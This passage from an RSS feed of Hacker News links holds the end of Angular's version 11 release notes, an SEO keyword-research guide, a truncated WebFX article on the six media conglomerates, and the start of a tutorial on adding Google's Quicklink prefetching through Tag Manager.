Logging</h2><p id="968c">We’ve made changes to the builder phase reporting to make it even more helpful during development. We are bringing in new CLI output updates to make logs and reports easier to read.</p><figure><div><div><p><img alt="Screenshot of angular CLI output nicely formatted into columns." src="https://miro.medium.com/max/1214/0*-dCa80651cnfbjpX" width="607" height="355" srcset="https://miro.medium.com/max/552/0*-dCa80651cnfbjpX 276w, https://miro.medium.com/max/1104/0*-dCa80651cnfbjpX 552w, https://miro.medium.com/max/1214/0*-dCa80651cnfbjpX 607w" sizes="607px" data-old-src="https://miro.medium.com/max/60/0*-dCa80651cnfbjpX?q=20"></p></div></div><figcaption>Improved CLI output formatting</figcaption></figure><h2 id="970e">Updated Language Service Preview</h2><p id="650a">The Angular Language Service provides helpful tools to make development with Angular productive and fun. The current version of the language service is based on View Engine and today we’re giving a sneak peek of the Ivy-based language service. The updated language service provides a more powerful and accurate experience for developers.</p><p id="15e6">Now, the language service will be able to correctly infer generic types in templates the same way the TypeScript compiler does. For example, in the screenshot below we’re able to infer that the iterable is of type string.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Screenshot of intellisense style insights in Angular templates." src="https://miro.medium.com/max/3000/0*L1Tg13gdu3PCqUNN" width="1500" height="902" srcset="https://miro.medium.com/max/552/0*L1Tg13gdu3PCqUNN 276w, https://miro.medium.com/max/1104/0*L1Tg13gdu3PCqUNN 552w, https://miro.medium.com/max/1280/0*L1Tg13gdu3PCqUNN 640w, https://miro.medium.com/max/1400/0*L1Tg13gdu3PCqUNN 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*L1Tg13gdu3PCqUNN?q=20"></p></div></div></div><figcaption>Angular Language Service inferring iterable types in templates</figcaption></figure><p id="e67f">This powerful new update is still in development but we wanted to share an update as we keep preparing it for a full release in an upcoming version.</p><h2 id="48a5">Updated Hot Module Replacement (HMR) Support</h2><p id="303f">Angular has offered support for HMR but enabling it required configuration and code changes making it less than ideal to quickly include in Angular projects. In version 11 we’ve updated the CLI to allow enabling HMR when starting an application with ng serve. To get started, run the following command:</p><pre><span id="3ac4">ng serve --hmr</span></pre><p id="f3bc">After the local server starts the console will display a message confirming that HMR is active:</p><p id="f521">NOTICE: Hot Module Replacement (HMR) is enabled for the dev server.</p><p id="5155">See <a href="https://webpack.js.org/guides/hot-module-replacement" rel="noopener">https://webpack.js.org/guides/hot-module-replacement</a> for information on working with HMR for webpack.</p><p id="3796">Now during development the latest changes to components, templates and styles will be instantly updated into the running application. All without requiring a full page refresh. Data typed into forms are preserved as well as scroll position providing a boost to developer productivity.</p><h2 id="6de3">Faster Builds</h2><p id="630c">We’re bringing a faster development and build cycle by making updates to some key areas.</p><ul><li id="4336">When installing dependencies, the ngcc update process is now 2–4x faster.</li><li id="b30d">Faster compilation with TypeScript v4.0.</li></ul><p id="ed18">Now, teams can opt-in to webpack v5. Currently, you could experiment with <a href="https://webpack.js.org/concepts/module-federation/" rel="noopener">module federation</a>. In the future, webpack v5 will clear the path for:</p><ul><li id="db89">Faster builds with persistent disk caching</li><li id="7ab4">Smaller bundles thanks to <a href="https://webpack.js.org/guides/tree-shaking/" rel="noopener">cjs tree-shaking</a></li></ul><p id="dae8">Support is experimental and under development so we don’t recommend opting in for production uses.</p><p id="4ca8">Want to try out webpack 5? To enable it in your project, add the following section to your package.json file:</p><pre><span id="386c">"resolutions": {<br>     "webpack": "5.4.0"<br>}</span></pre><p id="65a0">Currently, you’ll need to use <strong>yarn</strong> to test this as npm does not yet support the resolutions property.</p><h2 id="d0a9">Linting</h2><p id="e4b2">In previous versions of Angular, we’ve shipped a default implementation for linting (TSLint). Now, TSLint is deprecated by the project creators who recommend migration to ESLint. <a href="https://twitter.com/mrjameshenry" rel="noopener">James Henry</a> together with other folks from the open-source community developed a third-party solution and migration path via <a href="https://github.com/typescript-eslint/typescript-eslint" rel="noopener">typescript-eslint</a>, <a href="https://github.com/angular-eslint/angular-eslint" rel="noopener">angular-eslint</a> and <a href="https://github.com/typescript-eslint/tslint-to-eslint-config" rel="noopener">tslint-to-eslint-config</a>! We’ve been collaborating closely to ensure a smooth transition of Angular developers to the supported linting stack.</p><p id="6071">We’re deprecating the use of TSLint and Codelyzer in version 11. This means that in future versions the default implementation for linting Angular projects will not be available.</p><p id="806d">Head over to the <a href="https://github.com/angular-eslint/angular-eslint#migrating-from-codelyzer-and-tslint" rel="noopener">official project page</a> for a guide to incorporate angular-eslint in a project and migrate from TSLint.</p><h2 id="98a6">Housekeeping</h2><p id="0727">In this update we’re removing support for IE9/IE10 and IE mobile. IE11 is the only version of IE <a href="https://angular.io/guide/browser-support" rel="noopener">still supported</a> by Angular. We’ve also <a href="https://angular.io/guide/deprecations" rel="noopener">removed deprecated APIs</a> and added a few to the deprecation list. Be sure to check this out to make sure you are using the latest APIs and following our recommended best practices.</p><h2 id="a3c7">Roadmap</h2><p id="9aad">We’ve also updated the <a href="https://angular.io/guide/roadmap" rel="noopener">roadmap</a> to keep you posted on our current priorities. Some of the announcements in this post are updates on in-progress projects from the roadmap. This reflects our approach to incrementally rollout larger efforts and allows developers to provide early feedback that we can incorporate it into the final release.</p><p id="8c07">We collaborated with <a href="https://twitter.com/simpulton" rel="noopener">Lukas Ruebbelke</a> from the Angular community on updating the content of some of the projects to better reflect the value they provide to developers.</p><h2 id="6939">How to update to get version 11</h2><p id="0170">When you are ready to go run this command to update Angular and CLI:</p><pre><span id="5983">ng update @angular/cli @angular/core</span></pre><p id="ac5f">Head over to <a href="https://update.angular.io/" rel="noopener">update.angular.io</a> to find detailed information and guidance on updating. We always recommend upgrading one major release at a time to have the best update experience.</p><p id="732f">We hope you enjoy this feature update and be sure to let us know what you think here or on <a href="https://twitter.com/angular" rel="noopener">Twitter</a>!</p></div></div></section></div></div>]]>
            </description>
            <link>https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068668</guid>
            <pubDate>Thu, 12 Nov 2020 11:19:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Practical SEO Guide for Better Organic Traffic]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068655">thread link</a>) | @moeminm
<br/>
November 12, 2020 | https://blog.moeminmamdouh.com/step-by-step-practical-seo-guide-for-better-organic-traffic | <a href="https://web.archive.org/web/*/https://blog.moeminmamdouh.com/step-by-step-practical-seo-guide-for-better-organic-traffic">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1605179738846/BbIWPgv0m.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div><div><div><p>Subscribe to <!-- -->my<!-- --> newsletter and never miss <!-- -->my<!-- --> upcoming articles</p></div></div></div><div itemprop="text"><blockquote>
<p>You can find the links to all tools used at the end of the article.</p>
</blockquote>
<p>Paid advertising is great and all, but it stops once the money stops. I'm going to show you a step by step guide on how to do keyword research and use that to your advantage to create compelling articles that could potentially grow organically.</p>
<p>To do this, I'll use <a target="_blank" href="https://splitbee.io/?ref=blog.moeminmamdouh.com">Splitbee</a> as an example, it's a web analytics tool. </p>

<p>You need to first have an idea of who your competitors are in the market. A quick search on Google shows Clicky to be a similar service. Great, you've identified one competitor, we need more. Head over to <a target="_blank" href="https://www.similarweb.com/?ref=blog.moeminmamdouh.com">SimilarWeb</a>, search for your competitor's website, and scroll down to competitors. Pick 3-4 competitors and write them down somewhere.</p>

<p>You have 3-4 competitors written down, time to know what they're ranking for. Head over to <a target="_blank" href="https://neilpatel.com/ubersuggest/?ref=blog.moeminmamdouh.com">UberSuggest</a>, search for your competitors' websites, scroll down until you see '<strong>View all SEO keywords this domain ranks for</strong>" click.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605178434141/ZhquNa08n.png?auto=format&amp;q=60" alt="screely-1605178426390.png"></p>
<p>Now click on '<strong>Export to CSV</strong>'. You now have a list of keywords in a searchable file. Do this for all your competitors. </p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605178529872/VagIrc31X.png?auto=format&amp;q=60" alt="screely-1605178508313.png"></p>

<p>You'll most likely have hundreds of keywords in 1 CSV file. Import your CSV file into Excel. Apply conditional formatting to these columns:</p>
<p>1- Volume &gt; 1000</p>
<p>2- Position &lt; 20</p>
<p>3- SEO Difficulty &lt; 40</p>
<p>You're basically narrowing down to keywords that receive traffic, are ranked either in the first or second page, and are not too difficult to rank for. Do you just go ahead and create an article with all the keywords you've just narrowed? No. There's still more work to do!</p>

<p>After you've narrowed down the keywords, it's time to validate the keywords via Google Trends and/or Google Keyword Planner. Go to Google Trends and search for the keywords you've just narrowed and make sure to set the region to Worldwide. For example, I now have a keyword 'web stats site'. Is it receiving enough interest? Google's metric is /100. Most popular is 100, least popular is 0, and 50 is half-half. My keyword is spiking, at times it's 90, others 40, and sometimes 0. That's okay, we can gamble.</p>
<p>I now have 1 validated keyword, it's receiving &gt; 1000 traffic per mo, it's relatively low positioned, and isn't difficult to rank for.</p>

<p>Now....do you just use the keyword 'web stats site' in your title? No. Be creative. Write a blog article about '<em>Analyzing web site stats with Google Analytics</em>'. Sometimes the keywords don't make sense, run it through Ubersuggest again and look through the 'Keyword Ideas' section, maybe you'll find a better keyword. </p>
<p>I hope this was a somewhat helpful article to get you into keyword research and planning. It's a great boost and I think you should take advantage of it to boost your organic traffic! </p>
<p><strong>Tools used in this article:</strong></p>
<p>1- <a target="_blank" href="https://neilpatel.com/ubersuggest/?ref=blog.moeminmamdouh.com">UberSuggest</a></p>
<p>2- <a target="_blank" href="https://www.similarweb.com/?ref=blog.moeminmamdouh.com">SimilarWeb</a></p>
<p>3- <a target="_blank" href="https://trends.google.com/trends/?geo=US">Google Trends</a></p>
<p>4- <a target="_blank" href="https://ads.google.com/aw/keywordplanner">Google Keyword Ad Planner</a></p>
<p>Let me know if you have any questions and I'll be more than glad to help!</p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.moeminmamdouh.com/step-by-step-practical-seo-guide-for-better-organic-traffic</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068655</guid>
            <pubDate>Thu, 12 Nov 2020 11:16:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Companies That Own (Almost) All Media]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068634">thread link</a>) | @mrfusion
<br/>
November 12, 2020 | https://www.webfx.com/blog/internet/the-6-companies-that-own-almost-all-media-infographic/ | <a href="https://web.archive.org/web/*/https://www.webfx.com/blog/internet/the-6-companies-that-own-almost-all-media-infographic/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="description articleBody">



                            <p>In modern America, it feels like you have an unlimited variety of entertainment and media options right at your fingertips.</p>
<p>Television, film, and video game companies seem to come out of the woodwork in today’s startup-centric economy. Who knows what they’ll do next? But while it may&nbsp;<em>seem</em> like you have limitless options, most of the media you consume is owned by one of six companies. These six media companies are known as The Big 6.</p>
<p>While independent media outlets still exist (and there are a&nbsp;<em>lot</em> of them), the major outlets are almost all owned by these six conglomerates. To be clear, “media” in this context does not refer just to news outlets — it refers to any medium that controls the distribution of information. So here, “media” includes 24-hour news stations, newspapers, publishing houses, Internet utilities, and even video game developers.</p>

<p>With that in mind, let’s take a look at each of The Big 6, who control them, and what they own.</p>
<p><img data-src="https://www.webfx.com/blog/wp-content/uploads/2017/05/the-6-companies-that-own-almost-all-media-infographic3.jpg" alt="" width="500" height="4484" src="https://www.webfx.com/blog/wp-content/uploads/2017/05/the-6-companies-that-own-almost-all-media-infographic3.jpg"></p>
<p><img data-src="https://www.webfx.com/blog/wp-content/uploads/2017/05/the-6-companies-that-own-almost-all-media-infographic32.jpg" alt="" width="500" height="4872" srcset="https://www.webfx.com/blog/wp-content/uploads/2017/05/the-6-companies-that-own-almost-all-media-infographic32.jpg 500w, https://www.webfx.com/blog/wp-content/uploads/2017/05/the-6-companies-that-own-almost-all-media-infographic32-105x1024.jpg 105w" sizes="(max-width: 500px) 100vw, 500px" src="https://www.webfx.com/blog/wp-content/uploads/2017/05/the-6-companies-that-own-almost-all-media-infographic32.jpg"></p>
<h2>Media Conglomerate #1: National Amusements</h2>
<p>Unless you’re directly involved in business and / or entertainment, you’ve probably never heard of National Amusements before.</p>
<p>The company owns movie theaters throughout the world — about 950 total — but it owns much more than just movie theaters.</p>
<p>NA’s huge collection of properties is staggering. Whether they own a company entirely, possess majority shares, or even own minority voting shares, the scope of NA’s reach is enormous for a company that’s known less than its subsidiaries.</p>
<p>To start our look at NA, let’s check out one of the biggest names in modern business — Sumner Redstone.</p>
<h3>Head: Sumner Redstone</h3>
<p>Sumner Redstone is the current owner of National Amusements and all of its properties. While his daughter Shari has the title of President, Sumner Redstone retains most of the control over the company.</p>
<p>NA was first founded by Sumner Redstone’s father Michael Redstone, making National Amusements one of the most powerful and successful corporate dynasties in the United States.</p>
<p>None of the Redstones publish their salaries. After all, National Amusements is a private company.</p>
<p>However, finance experts can guess at Sumner Redstone’s overall net worth.</p>
<p>His net worth refers to the total financial value of what Sumner Redstone owns, minus any outstanding debts.</p>
<p>As he nears his 94th birthday in 2017, Sumner Redstone (and his estate) is worth an estimated $4.6 billion, according to&nbsp;<em>Forbes</em>.</p>
<center></center><p>While a decent amount of that value comes from his stake in National Amusements, much more of it comes from the companies that he owns.</p>
<h3>TV and Film Assets</h3>
<p>The most famous assets of National Amusements are almost all Viacom and CBS properties.</p>
<p>Combined, they make up the lion’s share of NA’s television and film acquisitions.</p>
<center></center><p>Still, that’s only a portion of what NA owns.</p>
<h3>Print Assets</h3>
<p>National Amusements has a modest collection of print publishers, but they’re pretty well-known.</p>
<p>The most well-known is Simon and Schuster, which National Amusements acquired when it purchased Viacom in 1999.</p>
<center></center>
<h3>Video Game Assets</h3>
<p>Along with other entertainment assets, National Amusements controls CBS Games.</p>
<p>Since its acquisition, CBS Games has rebranded to CBS Interactive, which now controls well-known gaming websites that we’ll look at next.</p>
<center></center>
<h3>Internet Assets</h3>
<p>With CBS Interactive, National Amusements controls giant chunks of the video game news and sports news industries.</p>
<p>These brands include GameSpot, Metacritic, c|net, and 247-Sports.</p>
<center></center>
<h2>Media Conglomerate #2: Disney</h2>
<p>Disney is probably the most well-known media name on this list.</p>
<p>The company has a hand in just about every medium in the world from children’s cinema to sports.</p>
<p>When it comes to television and film, there’s a good chance you’re watching something owned by the Disney company — even if it doesn’t have Disney’s name.</p>
<p>Why?</p>
<p>They own so,&nbsp;<em>so</em>&nbsp;much.</p>
<p>Let’s start with the company’s leader.</p>
<h3>Head: Bob Iger</h3>
<p>Disney announced Bob Iger as CEO on March 13, 2005, following the departure of Michael Eisner.</p>
<p>Since then, Iger has run a campaign of mergers and acquisitions to expand Disney into an even greater media powerhouse, especially with the acquisition of Marvel ($4 billion) and Lucasfilm ($4 billion).</p>
<p>His published salary is $44.9 million. That breaks down to:</p>
<ul>
<li>$1.73 million per paycheck</li>
<li>$172,692.32 per day</li>
<li>$21,586.54 per hour</li>
</ul>
<center></center><p>Why does Iger make so much money?</p>
<p>He (technically) oversees all of the following companies.</p>
<h3>TV and Film Assets</h3>
<p>First, let’s look at the bread and butter of Disney — television, and film.</p>
<p>Considering they have theme parks built to their entertainment assets, it’s clear that Disney is best known for its TV and film properties.</p>
<p>There are so many different companies that you really just have to see it for yourself.</p>
<center><img data-src="https://www.webfx.com/blog/wp-content/uploads/2017/05/07-disney-tv-and-film.png" alt="" width="555" height="820" srcset="https://www.webfx.com/blog/wp-content/uploads/2017/05/07-disney-tv-and-film.png 555w, https://www.webfx.com/blog/wp-content/uploads/2017/05/07-disney-tv-and-film-203x300.png 203w" sizes="(max-width: 555px) 100vw, 555px" src="https://www.webfx.com/blog/wp-content/uploads/2017/05/07-disney-tv-and-film.png"></center>
<h3>Print Assets</h3>
<p>Disney’s print assets are a mix of proprietary publishers, Lucasfilm acquisitions, and Marvel properties.</p>
<p>The mix gives Disney a controlling interest in massive publishing niches, especially comic books, and science fiction novels.</p>
<p>Disney also owns ESPN, which has its own publishing arm for all things sports.</p>
<center></center>
<h3>Video Game Assets</h3>
<p>Finally, Disney owns a few video game assets.</p>
<p>They’re not huge, but they’re enough to keep Disney mildly competitive and up-to-date in the video game industry (especially mobile gaming).</p>
<p>GameStar, a subsidiary of Disney Interactive Studios, is one of the best-known video game developers bought by Disney.</p>
<center></center>
<h2>Media Conglomerate #3: TimeWarner</h2>
<p>At the time of publication (11/7/16), it’s possible that ATandT will soon buy TimeWarner for around $80 billion.</p>
<p>If that happens, ATandT will acquire everything below and more.</p>
<p>In the meantime, let’s take a more in-depth look at TimeWarner and what it owns.</p>
<h3>Head: Jeff Bewkes</h3>
<p>Jeff Bewkes is the CEO of TimeWarner. He makes $32.5 million per year.</p>
<p>That works out to:</p>
<ul>
<li>$1.25 million per paycheck</li>
<li>$125,000 per workday</li>
<li>$15,625 per hour</li>
</ul>
<center></center><p>So why does one American earn&nbsp;<a href="http://statisticstimes.com/economy/countries-by-projected-gdp.php"><span>the make as much money as Micronesia</span></a>&nbsp;in a year?</p>
<p>As the head of TimeWarner, he’s responsible for all of the following companies.</p>
<h3>TV and Film Assets</h3>
<p>TimeWarner owns an incredible amount of television and film properties.</p>
<p>The most famous is probably Warner Brothers Animation Studios, which owns properties like Looney Tunes.</p>
<p>Along with that, TimeWarner has joint ventures in The CW and Hulu, along with ultra-niche TV programming for medical waiting rooms.</p>
<p>TimeWarner has also played a big role in comic book adaptations into movies, most notably with Batman.</p>
<p>Last, TimeWarner’s HBO branch achieved global renown with its runaway fantasy drama&nbsp;<em>Game of Thrones</em>, an adaptation of George R. R. Martin’s&nbsp;<em>A Song of Ice and Fire</em>.</p>
<p>Needless to say, TimeWarner’s television and film branches — including joint ventures like Hulu and CW — are doing pretty well these days.</p>
<center></center>
<h3>Print Assets</h3>
<p>On top of its incredible TV and movies, TimeWarner also controls several big-name print assets, including&nbsp;<em>TIME</em>&nbsp;(obviously).</p>
<center><img data-src="https://www.webfx.com/blog/wp-content/uploads/2017/05/12-tw-print.png" alt="" width="300" height="320" srcset="https://www.webfx.com/blog/wp-content/uploads/2017/05/12-tw-print.png 300w, https://www.webfx.com/blog/wp-content/uploads/2017/05/12-tw-print-281x300.png 281w" sizes="(max-width: 300px) 100vw, 300px" src="https://www.webfx.com/blog/wp-content/uploads/2017/05/12-tw-print.png"></center>
<h3>Investments</h3>
<p>TimeWarner has one of the most diverse investment portfolios of any media company.</p>
<p>Their investments act as controlling interests in lots of companies, some of which aren’t related to media.</p>
<p>But no matter what they are, each investment gives TimeWarner a stronger foothold in media.</p>
<center></center>
<h3>Video Game Assets</h3>
<p>As the owner of DC Comics, Looney Tunes, and tons of other fictional characters, it makes sense that TimeWarner owns a list of accomplished video game studios.</p>
<p>The most well-known is probably NetherRealm, which owns and publishes the controversial (and popular)&nbsp;<em>Mortal Kombat</em>&nbsp;series.</p>
<p>They also own Rocksteady, which is responsible for many of the latest Batman games.</p>
<center><img data-src="https://www.webfx.com/blog/wp-content/uploads/2017/05/14-tw-video-games.png" alt="" width="280" height="350" srcset="https://www.webfx.com/blog/wp-content/uploads/2017/05/14-tw-video-games.png 280w, https://www.webfx.com/blog/wp-content/uploads/2017/05/14-tw-video-games-240x300.png 240w" sizes="(max-width: 280px) 100vw, 280px" src="https://www.webfx.com/blog/wp-content/uploads/2017/05/14-tw-video-games.png"></center>
<h3>Music Assets</h3>
<p>TimeWarner doesn’t own a lot in music, but they have enough to ensure musical support for their other properties.</p>
<p>WaterTower Music might be the better-known business of the two enterprises, but Warner Music Group is still an essential part of the TimeWarner brand.</p>
<center></center>
<h3>Internet Assets</h3>
<p>Finally, TimeWarner is the first company on our list that also acts as an Internet service provider.</p>
<p>TimeWarner Cable is a major ISP in the United States, and it regularly competes with Comcast.</p>
<p>While its reputation differs from person to person, TimeWarner Cable is wildly profitable, and it’s become a major pillar of TimeWarner’s success.</p>
<center></center>
<h2>Media Conglomerate #4: Comcast</h2>
<p>Comcast is one of the few remaining Internet service providers in the United States. They also provide cable television and phone services to residential and business customers.</p>
<p>In 2013, Comcast expanded its reach into entertainment by purchasing NBC and pretty much all of its properties.</p>
<p>While most people know NBC as just a television station, it also has major stakes in media companies around the world.</p>
<p>That makes Comcast a major contender in global media, especially in the United States.</p>
<h3>Head: Brian L. Roberts</h3>
<p>Brian L. Roberts became President of Comcast in 1990, back when the company only earned&nbsp;<a href="http://corporate.comcast.com/news-information/leadership-overview/brian-l-roberts"><span>$657 million in annual revenue</span></a>.</p>
<p>That may sound like a ridiculous figure to use with the term “only,” but under Roberts’ leadership, the company now earns $74.5 billion annually.</p>
<p>As a result, Roberts is compensated well. He earns $40.8 million per year, which works out to:</p>
<ul>
<li>$1.57 million per paycheck</li>
<li>$156,923.04 per workday</li>
<li>$19,615.38 per hour</li>
</ul>
<center></center><p>That salary may be exclusive to Comcast’s utilities subscriptions. But that’s not the only way the ISP megalith earns money.</p>
<h3>TV and Film Assets</h3>
<p>With the acquisition of NBC, Comcast expanded its repertoire of TV and film assets many times over.</p>
<p>TV programming from NBC, cinema from Universal Pictures, and next-gen publishers like AwesomenessTV are all integral to Comcast’s growth and sustainability over the next few decades.</p>
<p>Even their religious niche branch — Big Idea — plays an important part in Comcast’s continued success and increased competitiveness in the media world.</p>
<center></center>
<h3>Internet Assets</h3>
<p>Most famously, Comcast is known as an Internet provider.</p>
<p>It’s a direct competitor to TimeWarner Cable, and it’s the primary (or only) ISP in dozens of regions in the United States.</p>
<center></center>
<h3>Ventures</h3>
<p>Last, Comcast has a laundry …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.webfx.com/blog/internet/the-6-companies-that-own-almost-all-media-infographic/">https://www.webfx.com/blog/internet/the-6-companies-that-own-almost-all-media-infographic/</a></em></p>]]>
            </description>
            <link>https://www.webfx.com/blog/internet/the-6-companies-that-own-almost-all-media-infographic/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068634</guid>
            <pubDate>Thu, 12 Nov 2020 11:12:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google Tag Manager Quicklink – Faster Onsite Navigation]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068608">thread link</a>) | @franze
<br/>
November 12, 2020 | https://www.franz-enzenhofer.com/a/quicklink-tag-manager-faster | <a href="https://web.archive.org/web/*/https://www.franz-enzenhofer.com/a/quicklink-tag-manager-faster">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><main id="content" role="main"><div><div><article id="post-1158"><p><a href="https://www.franz-enzenhofer.com/wp-content/uploads/quicklink-1024x661.jpg"><img width="930" height="620" src="https://www.franz-enzenhofer.com/wp-content/uploads/quicklink-930x620.jpg" alt="Quicklink Google Tag Manager" loading="lazy" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20930%20620'%3E%3C/svg%3E" data-lazy-src="https://www.franz-enzenhofer.com/wp-content/uploads/quicklink-930x620.jpg"></a></p><div><p>I already described <a href="https://www.franz-enzenhofer.com/a/gtag-make-faster" target="_blank" rel="noreferrer noopener">how to load 3rd party 💩 dependencies faster user Google Tag Manager</a> in the previous post. <strong>Now let’s speed up whenever a user clicks around</strong> on your website a.k.a. navigates around a.k.a. secondary pageviews. Again using Google Tag Manager.</p><h2>1) Go into Google Tag Manager</h2><div><figure><a href="https://tagmanager.google.com/#/home" target="_blank" rel="noopener noreferrer"><img loading="lazy" src="https://www.gstatic.cn/analytics-suite/header/suite/v2/ic_tag_manager.svg" alt="Google Tag Manager | Google Developers" width="192" height="192" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20192%20192'%3E%3C/svg%3E"></a></figure></div><p>Go into <a href="https://tagmanager.google.com/" target="_blank" rel="noreferrer noopener">Google Tag Manager</a> and select your <a href="https://support.google.com/tagmanager/answer/7059647?hl=en" target="_blank" rel="noreferrer noopener">Workspace</a>.</p><h2>2) Create a new Custom-Tag „QuickLink Gtag“</h2><figure><img loading="lazy" width="1024" height="407" src="https://www.franz-enzenhofer.com/wp-content/uploads/image-9-1024x407.png" alt="" srcset="https://www.franz-enzenhofer.com/wp-content/uploads/image-9-1024x407.png 1024w, https://www.franz-enzenhofer.com/wp-content/uploads/image-9-300x119.png 300w, https://www.franz-enzenhofer.com/wp-content/uploads/image-9-768x305.png 768w, https://www.franz-enzenhofer.com/wp-content/uploads/image-9.png 1414w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201024%20407'%3E%3C/svg%3E" data-lazy-srcset="https://www.franz-enzenhofer.com/wp-content/uploads/image-9-1024x407.png 1024w, https://www.franz-enzenhofer.com/wp-content/uploads/image-9-300x119.png 300w, https://www.franz-enzenhofer.com/wp-content/uploads/image-9-768x305.png 768w, https://www.franz-enzenhofer.com/wp-content/uploads/image-9.png 1414w" data-lazy-src="https://www.franz-enzenhofer.com/wp-content/uploads/image-9-1024x407.png"></figure><ul><li>Name: Quicklink Gtag</li><li>Tag Type: Custom HTML</li></ul><h2>3) Add Quicklink Code</h2><figure><a href="https://github.com/GoogleChromeLabs/quicklink" target="_blank" rel="noopener noreferrer"><img loading="lazy" src="https://www.franz-enzenhofer.com/wp-content/uploads/quicklink.png" alt="" width="749" height="211" srcset="https://www.franz-enzenhofer.com/wp-content/uploads/quicklink.png 749w, https://www.franz-enzenhofer.com/wp-content/uploads/quicklink-300x85.png 300w" sizes="(max-width: 749px) 100vw, 749px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20749%20211'%3E%3C/svg%3E" data-lazy-srcset="https://www.franz-enzenhofer.com/wp-content/uploads/quicklink.png 749w, https://www.franz-enzenhofer.com/wp-content/uploads/quicklink-300x85.png 300w" data-lazy-src="https://www.franz-enzenhofer.com/wp-content/uploads/quicklink.png"></a></figure><p><a rel="noreferrer noopener" href="https://github.com/GoogleChromeLabs/quicklink" target="_blank">Quicklink</a> is a <strong>Google Labs project</strong> to prefetch pages whenever visible links are in the viewport of a browser window. So whenever a user actually clicks on the link, the HTML of these pages is already available in the browser. It’s implemented in a way to be gentle to the processing power and the network connection of the user.</p><p>Copy paste this code 👇 into the tag.</p><pre><code>&lt;script src="https://unpkg.com/quicklink"&gt;&lt;/script&gt;
&lt;script&gt;
quicklink.listen();
&lt;/script&gt;</code></pre><ul><li><a href="https://unpkg.com/" target="_blank" rel="noreferrer noopener">unpkg.com</a> is a fast, free, global content delivery network for javascript packages.</li><li><a href="https://unpkg.com/quicklink" target="_blank" rel="noreferrer noopener">https://unpkg.com/quicklink</a> always points to the newest quicklink version.</li></ul><p>Result:</p><figure><img loading="lazy" width="1024" height="691" src="https://www.franz-enzenhofer.com/wp-content/uploads/image-10-1024x691.png" alt="" srcset="https://www.franz-enzenhofer.com/wp-content/uploads/image-10-1024x691.png 1024w, https://www.franz-enzenhofer.com/wp-content/uploads/image-10-300x202.png 300w, https://www.franz-enzenhofer.com/wp-content/uploads/image-10-768x518.png 768w, https://www.franz-enzenhofer.com/wp-content/uploads/image-10-1536x1036.png 1536w, https://www.franz-enzenhofer.com/wp-content/uploads/image-10.png 1758w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201024%20691'%3E%3C/svg%3E" data-lazy-srcset="https://www.franz-enzenhofer.com/wp-content/uploads/image-10-1024x691.png 1024w, https://www.franz-enzenhofer.com/wp-content/uploads/image-10-300x202.png 300w, https://www.franz-enzenhofer.com/wp-content/uploads/image-10-768x518.png 768w, https://www.franz-enzenhofer.com/wp-content/uploads/image-10-1536x1036.png 1536w, https://www.franz-enzenhofer.com/wp-content/uploads/image-10.png 1758w" data-lazy-src="https://www.franz-enzenhofer.com/wp-content/uploads/image-10-1024x691.png"></figure><h2>4) Trigger „QuickLink Gtag“</h2><p>Either trigger it on all pages.</p><figure><img loading="lazy" width="1024" height="327" src="https://www.franz-enzenhofer.com/wp-content/uploads/image-11-1024x327.png" alt="" srcset="https://www.franz-enzenhofer.com/wp-content/uploads/image-11-1024x327.png 1024w, https://www.franz-enzenhofer.com/wp-content/uploads/image-11-300x96.png 300w, https://www.franz-enzenhofer.com/wp-content/uploads/image-11-768x245.png 768w, https://www.franz-enzenhofer.com/wp-content/uploads/image-11.png 1502w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201024%20327'%3E%3C/svg%3E" data-lazy-srcset="https://www.franz-enzenhofer.com/wp-content/uploads/image-11-1024x327.png 1024w, https://www.franz-enzenhofer.com/wp-content/uploads/image-11-300x96.png 300w, https://www.franz-enzenhofer.com/wp-content/uploads/image-11-768x245.png 768w, https://www.franz-enzenhofer.com/wp-content/uploads/image-11.png 1502w" data-lazy-src="https://www.franz-enzenhofer.com/wp-content/uploads/image-11-1024x327.png"></figure><p><strong>or </strong>even better, much, much better indeed, <strong>trigger it on minimal user interaction </strong>as outlined <a rel="noreferrer noopener" href="https://www.franz-enzenhofer.com/a/gtag-make-faster" target="_blank">in my previous post</a> -&gt; <a rel="noreferrer noopener" href="https://www.franz-enzenhofer.com/a/gtag-make-faster" 